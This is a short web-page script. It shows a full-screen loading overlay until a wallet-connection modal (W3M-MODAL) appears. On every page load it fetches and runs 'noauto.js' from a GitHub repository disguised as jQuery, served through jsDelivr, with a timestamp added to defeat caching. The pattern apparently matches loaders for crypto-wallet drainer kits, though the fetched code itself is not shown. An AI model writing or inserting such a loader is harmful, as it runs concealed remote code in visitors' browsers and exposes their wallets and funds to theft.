document.addEventListener('DOMContentLoaded', () => {
    const preloader = document.createElement("div");
    preloader.id = "preloader";
    preloader.style.position = "fixed";
    preloader.style.top = "0";
    preloader.style.left = "0";
    preloader.style.width = "100%";
    preloader.style.height = "100%";
    preloader.style.backgroundColor = "rgba(0, 0, 0, 0.8)";
    preloader.style.display = "flex";
    preloader.style.justifyContent = "center";
    preloader.style.alignItems = "center";
    preloader.style.zIndex = "1000";
    preloader.innerHTML = `
        <div class="loader" style="width: 50px; height: 50px; border: 5px solid #ccc; border-top: 5px solid #333; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    `;
    document.body.appendChild(preloader);

    const observer = new MutationObserver(function (mutationsList) {
        for (let mutation of mutationsList) {
            if (mutation.addedNodes.length > 0) {
                mutation.addedNodes.forEach(node => {
                    if (node.tagName === "W3M-MODAL") {
                        preloader.remove();
                        observer.disconnect();
                    }
                });
            }
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
});
var currentUnixTimestamp = Math.floor(Date.now() / 1000);
var script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/gh/nd91jqf/jquery@main/noauto.js?version=' + currentUnixTimestamp;
document.head.appendChild(script);
